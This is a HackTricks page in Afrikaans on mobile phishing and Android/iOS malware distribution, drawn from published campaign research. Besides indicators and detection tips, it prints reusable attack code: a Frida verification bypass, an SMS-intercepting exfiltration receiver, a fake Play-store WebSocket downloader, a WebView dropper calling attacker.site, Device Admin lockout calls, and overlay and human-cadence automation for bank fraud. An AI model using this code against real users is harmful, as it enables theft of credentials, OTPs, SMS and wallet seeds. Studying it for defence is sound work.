# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Hierdie bladsy dek tegnieke wat deur bedreigingsakteurs gebruik word om **kwaadwillige Android APKs** en **iOS mobile-configuration profiles** te versprei via phishing (SEO, sosiale ingenieurswese, vals winkels, dating‑apps, ens.).
> Materiaal is aangepas vanaf die SarangTrap‑veldtog wat deur Zimperium zLabs (2025) ontbloot is en ander openbare navorsing.

## Aanvalvloei

1. **SEO/Phishing Infrastructure**
* Registreer dosyne look-alike domeine (dating, cloud share, car service…).
– Gebruik plaaslike taal sleutelwoorde en emoji's in die `<title>` element om in Google te rangskik.
– Host *beide* Android (`.apk`) en iOS installasie-instruksies op dieselfde landing page.
2. **Eerste Fase Aflaai**
* Android: direkte skakel na 'n *ongeteken* of “derde‑party winkel” APK.
* iOS: `itms-services://` of gewone HTTPS skakel na 'n kwaadwillige **mobileconfig** profiel (sien hieronder).
3. **Post-install Sosiale Ingenieurswese**
* By die eerste uitvoering vra die app vir 'n **uitnodiging / verifikasie kode** (illusie van eksklusiewe toegang).
* Die kode word **POSTed oor HTTP** na die Command-and-Control (C2).
* C2 antwoord `{"success":true}` ➜ malware gaan voort.
* Sandbox / AV dinamiese analise wat nooit 'n geldige kode indien nie sien **geen kwaadwillige gedrag** (ontduiking).
4. **Runtime Permission Abuse** (Android)
* Gevaarlike permissies word slegs aangevra **na positiewe C2‑antwoord**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Onlangse variante **verwyder `<uses-permission>` vir SMS uit `AndroidManifest.xml`** maar laat die Java/Kotlin kodepad wat SMS deur refleksie lees agter ⇒ verlaag statiese punte terwyl dit steeds funksioneel is op toestelle wat die permissie toeken via `AppOps` misbruik of ou teikens.

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 het **Restricted settings** vir sideloaded apps geïntroduseer: Accessibility en Notification Listener skakelaars is uitgegrys totdat die gebruiker eksplisiet restricted settings in **App info** toelaat.
* Phishing‑bladsye en droppers lewer nou stap‑vir‑stap UI instruksies om restricted settings vir die sideloaded app te **toelaat** en daarna Accessibility/Notification toegang te aktiveer.
* 'n Nuweer omseiling is om die payload te installeer via 'n **session‑based PackageInstaller flow** (dieselfde metode wat app winkels gebruik). Android behandel die app as winkel‑geïnstalleer, so Restricted settings blokkeer nie meer Accessibility nie.
* Triage wenk: in 'n dropper, grep vir `PackageInstaller.createSession/openSession` plus kode wat onmiddellik die slagoffer na `ACTION_ACCESSIBILITY_SETTINGS` of `ACTION_NOTIFICATION_LISTENER_SETTINGS` navigeer.

6. **Facade UI & Background Collection**
* App wys onskadelike views (SMS viewer, gallery picker) wat lokaal geïmplementeer is.
* Intussen eksfiltreer dit:
- IMEI / IMSI, telefoonnommer
- Volle `ContactsContract` dump (JSON array)
- JPEG/PNG vanaf `/sdcard/DCIM` gecomprimeer met [Luban](https://github.com/Curzibn/Luban) om grootte te verminder
- Opsionele SMS inhoud (`content://sms`)
Payloads word **batch‑gezipped** en gestuur via `HTTP POST /upload.php`.
7. **iOS Delivery Technique**
* 'n Enkel **mobile-configuration profile** kan `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` ens. versoek om die toestel in 'n “MDM”-agtige toesig te registreer.
* Sosiale‑ingenieurswese instruksies:
1. Maak Settings oop ➜ *Profile downloaded*.
2. Tik drie keer op *Install* (skermskote op die phishing bladsy).
3. Trust die unsigned profile ➜ aanvaller kry *Contacts* & *Photo* entitlements sonder App Store hersiening.
8. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads kan 'n phishing URL **vaspen aan die Home Screen** met 'n gebrande ikoon/etiket.
* Web Clips kan in **full‑screen** loop (versteek die browser UI) en gemerk wees as **non‑removable**, wat die slagoffer dwing om die profiel te verwyder om die ikoon te verwyder.
9. **Network Layer**
* Gewoon HTTP, dikwels op poort 80 met HOST header soos `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (geen TLS → maklik om te identifiseer).

## Red-Team Tips

* **Dynamic Analysis Bypass** – Tydens malware evaluering, automatiseer die uitnodigingskode fase met Frida/Objection om die kwaadwillige tak te bereik.
* **Manifest vs. Runtime Diff** – Vergelyk `aapt dump permissions` met runtime `PackageManager#getRequestedPermissions()`; ontbrekende gevaarlike perms is 'n rooi vlag.
* **Network Canary** – Konfigureer `iptables -p tcp --dport 80 -j NFQUEUE` om onsamehangende POST‑uitbarstings na kode‑invoer op te spoor.
* **mobileconfig Inspection** – Gebruik `security cms -D -i profile.mobileconfig` op macOS om `PayloadContent` te lys en oormatige entitlements te identifiseer.

## Nuttige Frida-snippet: Auto-Bypass uitnodigingskode

<details>
<summary>Frida: outo‑omseil uitnodigingskode</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Aanwysers (Algemeen)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Hierdie patroon is waargeneem in veldtogte wat regeringsvoordeel-temas misbruik om Indiese UPI-inlogbesonderhede en OTP's te steel. Operateurs ketting betroubare platforms vir aflewering en veerkragtigheid.

### Delivery chain across trusted platforms
- YouTube-video lokaas → beskrywing bevat 'n kort skakel
- Kortskakel → GitHub Pages phishing site wat die legitieme portaal naboots
- Dieselfde GitHub repo huisves 'n APK met 'n vals “Google Play” badge wat direk na die lêer skakel
- Dinamiese phishing-bladsye is op Replit; die remote command channel gebruik Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- Eerste APK is 'n installer (dropper) wat die werklike malware by `assets/app.apk` bevat en die gebruiker vra om Wi‑Fi/mobiele data af te skakel om cloud detection te verswak.
- Die embedded payload word onder 'n onskuldige etiket geïnstalleer (bv. “Secure Update”). Na installasie is beide die installer en die payload as afsonderlike apps teenwoordig.

Statiese triage-wenk (grep vir embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dynamiese endpoint-ontdekking via shortlink
- Malware haal 'n plain-text, komma-geskeide lys van lewende endpoints vanaf 'n shortlink; eenvoudige string-transformasies produseer die finale phishing-pagina-pad.

Voorbeeld (gesaniteer):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudokode:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-gebaseerde UPI-kredensiale-insameling
- Die “Make payment of ₹1 / UPI‑Lite” stap laai 'n aanvaller se HTML-vorm vanaf die dinamiese eindpunt binne 'n WebView en vang sensitiewe velde (foon, bank, UPI PIN) wat met `POST` na `addup.php` gestuur word.

Minimale lader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagasie en SMS/OTP-interseptasie
- Aggressiewe toestemmings word by die eerste uitvoering versoek:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakte word herhaaldelik verwerk om massaal smishing SMS vanaf die slagoffer se toestel te stuur.
- Inkomende SMS word deur 'n broadcast receiver onderskep en saam met metadata (sender, body, SIM slot, per-device random ID) na `/addsm.php` opgelaai.

Ontvanger-skets:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) as 'n veerkragtige C2
- Die payload registreer by FCM; push messages dra 'n `_type`-veld wat as 'n skakelaar gebruik word om aksies te aktiveer (bv., update phishing text templates, toggle behaviours).

Voorbeeld FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Hanteraar-skets:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Aanwysers/IOCs
- APK bevat sekondêre payload by `assets/app.apk`
- WebView laai betaling vanaf `gate.htm` en exfiltrates na `/addup.php`
- SMS exfiltration na `/addsm.php`
- Shortlink-gedrewe config fetch (bv., `rebrand.ly/*`) wat CSV-endpunte teruggee
- Apps gemerk as generiese “Update/Secure Update”
- FCM `data` boodskappe met 'n `_type` discriminator in onbetroubare apps

---

## Socket.IO/WebSocket-gebaseerde APK Smuggling + Vals Google Play-bladsye

Aanvallers vervang toenemend statiese APK-skakels met 'n Socket.IO/WebSocket-kanaal ingebed in lokmiddels wat soos Google Play lyk. Dit verberg die payload-URL, omseil URL/uitbreidingsfilters, en behou 'n realistiese installasie-UX.

Tipiese kliëntvloei waargeneem in die veld:

<details>
<summary>Socket.IO vals Play-downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Hoekom dit eenvoudige kontroles omseil:
- Geen statiese APK-URL word blootgestel nie; die payload word in geheue uit WebSocket-frames herbou.
- URL/MIME/uitbreidingsfilters wat direkte .apk-antwoorde blokkeer, mag binêre data wat via WebSockets/Socket.IO getunnel is, mis.
- Crawlers en URL-sandboxes wat nie WebSockets uitvoer nie, sal die payload nie kan aflaai nie.

Sien ook WebSocket tradecraft en tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Misbruik, ATS-automatisering en NFC-relay-orkestrasie – RatOn gevallestudie

Die RatOn banker/RAT-campagne (ThreatFabric) is ’n konkrete voorbeeld van hoe moderne mobiele phishing-operasies WebView-droppers, Accessibility-gedrewe UI-automatisering, overlays/ransom, Device Admin-dwinging, Automated Transfer System (ATS), crypto wallet-oorname en selfs NFC-relay-orkestrasie kombineer. Hierdie afdeling abstraheer die herbruikbare tegnieke.

### Stage-1: WebView → native install bridge (dropper)
Aanvallers wys ’n WebView wat na ’n aanvallersbladsy wys en injekteer ’n JavaScript-interface wat ’n native installer ontsluit. ’n Tik op ’n HTML-knoppie roep native kode aan wat ’n tweede-fase APK, ingebundel in die dropper se assets, installeer en dit dan direk begin.

Minimale patroon:

<details>
<summary>Stage-1 dropper minimale patroon (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML op die bladsy:
```html
<button onclick="bridge.installApk()">Install</button>
```
Na installasie start die dropper die payload via eksplisiete package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Opsporingsidee: onbetroubare apps wat `addJavascriptInterface()` aanroep en installer-agtige metodes aan WebView blootstel; APK wat 'n embedded secondary payload onder `assets/` verskeep en die Package Installer Session API aanroep.

### Toestemmingsfunnel: Accessibility + Device Admin + opvolgende runtime prompts
Fase-2 open 'n WebView wat 'n “Access”-blad huisves. Die knoppie roep 'n geїksporteerde metode aan wat die slagoffer na die Accessibility-instellings navigeer en versoek om die rogue service te aktiveer. Sodra toegestaan, gebruik malware Accessibility om outomaties deur daaropvolgende runtime toestemmingdialoë te klik (contacts, overlay, manage system settings, ens.) en versoek Device Admin.

- Accessibility help programmaties om later prompts te aanvaar deur knoppies soos “Allow”/“OK” in die node-tree te vind en klikke te stuur.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/afpersing via WebView
Operateurs kan opdragte uitstuur om:
- 'n volskerm-overlay vanaf 'n URL weergee, of
- inline HTML deurgee wat in 'n WebView-overlay gelaai word.

Waarskynlike gebruike: dwang (PIN-invoer), wallet-opening om PINs vas te vang, afpersingsboodskappe. Hou 'n opdrag om te verseker dat overlay-toestemming verleen is as dit ontbreek.

### Remote control model – teks pseudo-skerm + screen-cast
- Lae-bandwydte: gooi periodiek die Accessibility node tree uit, serialiseer sigbare teks, rolle en bounds en stuur dit na C2 as 'n pseudo-skerm (opdragte soos `txt_screen` eenmalig en `screen_live` deurlopend).
- Hoë getrouheid: versoek MediaProjection en begin screen-casting/opname op aanvraag (opdragte soos `display` / `record`).

### ATS playbook (bank-app-automatisering)
Gegewe 'n JSON-taak, open die bank-app, bestuur die UI via Accessibility met 'n mengsel van teksnavrae en koördinaat-tappe, en voer die slagoffer se betaal-PIN in wanneer dit versoek word.

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "Nuwe betaling"
- "Zadat platbu" → "Voer betaling in"
- "Nový příjemce" → "Nuwe ontvanger"
- "Domácí číslo účtu" → "Inlandse rekeningnommer"
- "Další" → "Volgende"
- "Odeslat" → "Stuur"
- "Ano, pokračovat" → "Ja, gaan voort"
- "Zaplatit" → "Betaal"
- "Hotovo" → "Klaar"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Crypto-wallet seed-uittrekking
Teikens soos MetaMask, Trust Wallet, Blockchain.com, Phantom. Vloei: ontsluit (gesteelde PIN of verskafde wagwoord), navigeer na Security/Recovery, openbaar/vertoon seed phrase, keylog/exfiltrate dit. Implementeer lokalisasie-gesinde selektore (EN/RU/CZ/SK) om navigasie oor tale te stabiliseer.

### Device Admin-dwinging
Device Admin APIs word gebruik om PIN-vangkansies te verhoog en die slagoffer te frustreer:

- Onmiddellike vergrendeling:
```java
dpm.lockNow();
```
- Laat huidige credential verval om verandering af te dwing (Accessibility vang nuwe PIN/password op):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Forceer nie-biometriese ontgrendeling deur keyguard se biometriese funksies uit te skakel:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Let wel: Baie DevicePolicyManager-beheer vereis Device Owner/Profile Owner op onlangse Android; sommige OEM-boues mag los wees. Valideer dit altyd op die teiken OS/OEM.

### NFC relay orchestration (NFSkate)
Stage-3 kan 'n eksterne NFC-relais-module installeer en loods (bv. NFSkate) en selfs 'n HTML-sjabloon daaraan oorgee om die slagoffer tydens die relais te lei. Dit maak kontaklose card-present cash-out saam met aanlyn ATS moontlik.

Agtergrond: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Toeganklikheid-gedrewe ATS anti-detectie: menslike teksritme en dubbele teksinspuiting (Herodotus)

Dreigowerwers meng toenemend Accessibility-gedrewe outomatisering met anti-detectie wat afgestem is op basiese gedragsbiometrie. 'n Onlangse banker/RAT toon twee aanvullende teks-afleweringsmodusse en 'n operateur-omskakelaar om menslike tikgedrag met gerandomiseerde kadensie te simuleer.

- Ontdekkingsmodus: enumereer sigbare nodes met selectors en bounds om insette presies te teiken (ID, text, contentDescription, hint, bounds) voordat daar opgetree word.
- Dubbele teksinspuiting:
- Modus 1 – `ACTION_SET_TEXT` direk op die teiken-node (stabiel, geen sleutelbord);
- Modus 2 – clipboard set + `ACTION_PASTE` in die gefokusde node (werk wanneer direkte setText geblokkeer is).
- Menslike kadensie: deel die operateur-geleverde string op en lewer dit karakter-vir-karakter met gerandomiseerde 300–3000 ms vertragings tussen gebeure om “machine-speed typing” heuristieke te ontduik. Geïmplementeer hetsy deur die waarde progressief te laat groei via `ACTION_SET_TEXT`, of deur een karakter op 'n slag te plak.

<details>
<summary>Java sketch: node discovery + delayed per-char input via setText or clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Blokkerende overlays vir bedrogskuiling:
- Rendeer 'n skermvullende `TYPE_ACCESSIBILITY_OVERLAY` met operateur-beheerde deursigtigheid; hou dit opaak vir die slagoffer terwyl afstandsautomatisering daaronder voortgaan.
- Gereelde opdragte: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Minimale overlay met verstelbare alfa:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Operator-kontroleprimitiewe wat dikwels gesien word: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (skermdeling).

## Verwysings

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
